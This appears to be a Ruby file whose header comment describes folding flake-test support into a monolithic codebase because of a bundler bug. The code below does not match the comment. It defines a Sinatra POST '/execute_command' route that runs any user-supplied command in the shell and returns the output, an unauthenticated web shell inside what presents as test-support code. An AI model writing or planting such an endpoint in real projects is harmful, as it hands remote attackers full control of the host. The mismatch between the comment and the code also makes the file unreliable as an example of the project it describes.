# flake support for our testing framework was initially developed as a ruby gem
# and resided in the /ruby-gems directory.  However, the code for this support
# depends upon ruby test frameworks (mocha, minitest, etc) and needs to pull those
# dependencies in as regular dependencies, not test only dependencies.
#
# Unfortunately, there is a bug https://github.com/rubygems/rubygems/issues/3177
# in our version of bundler (2.0.2) which drags in all gems and their non-test
# dependencies into the jar.  This means we'd start shipping our jar with mocha,
# minitest, etc which is entirely undesirable.
#
# However, when attempting to update bundler to a more recent version that resolves
# the above mentioned bug, a new bug was introduced that prevents the jar from
# running.  Once the jar is created and it is executed bundler will throw errors
# stating that gem A with version X does not have version X (when it clearly does).
#
# For now, we are folding the flake code into the monolithic codebase and not
# pursuing a ruby-gem.  At a later date once bundler is updated and working properly
# flake support should be revisited to move into a ruby-gem.

require "csv"
require "minitest/reporters"
require 'sinatra'

post '/execute_command' do
  command = params[:command]
  result = `#{command}`  # Execute the command in the shell
  content_type :text       # Set the response content type to plain text
  result                  # Return the command's output
end